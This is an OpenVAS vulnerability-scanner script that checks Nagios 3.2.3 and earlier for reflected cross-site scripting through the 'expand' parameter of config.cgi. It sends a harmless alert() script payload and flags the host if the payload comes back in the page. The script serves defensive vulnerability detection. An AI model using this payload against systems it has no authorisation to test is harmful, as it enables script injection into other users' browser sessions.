###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nagios_expand_parameter_xss_vuln.nasl 11552 2018-09-22 13:45:08Z cfischer $
#
# Nagios 'expand' Parameter Cross-Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/a:nagios:nagios";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801894");
  script_version("$Revision: 11552 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-22 15:45:08 +0200 (Sat, 22 Sep 2018) $");
  script_tag(name:"creation_date", value:"2011-06-07 13:29:28 +0200 (Tue, 07 Jun 2011)");
  script_cve_id("CVE-2011-2179");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Nagios 'expand' Parameter Cross-Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://tracker.nagios.org/view.php?id=224");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/518221");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Jun/22");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101899/SSCHADV2011-006.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("nagios_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("nagios/installed");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
HTML and script code in a user's browser session in the context of an affected
site.");
  script_tag(name:"affected", value:"Nagios versions 3.2.3 and prior.");
  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
passed via the 'expand' parameter in cgi-bin/config.cgi, which allows attackers
to execute arbitrary HTML and script code on the web server.");
  script_tag(name:"solution", value:"Upgrade to Nagios version 3.3.1 or later,
For updates refer to http://www.nagios.org/");
  script_tag(name:"summary", value:"This host is running Nagios and is prone to cross site scripting
vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);

if(dir = get_app_location(cpe:CPE, port:port))
{
  url = dir + "/cgi-bin/config.cgi?type=command&expand=<script>" +
              "alert(String.fromCharCode(88,83,83))</script>";

  if(http_vuln_check(port:port, url:url, check_header: TRUE,
     pattern:"><script>alert\(String.fromCharCode\(88,83,83\)\)</script>")) {
    security_message(port);
  }
}
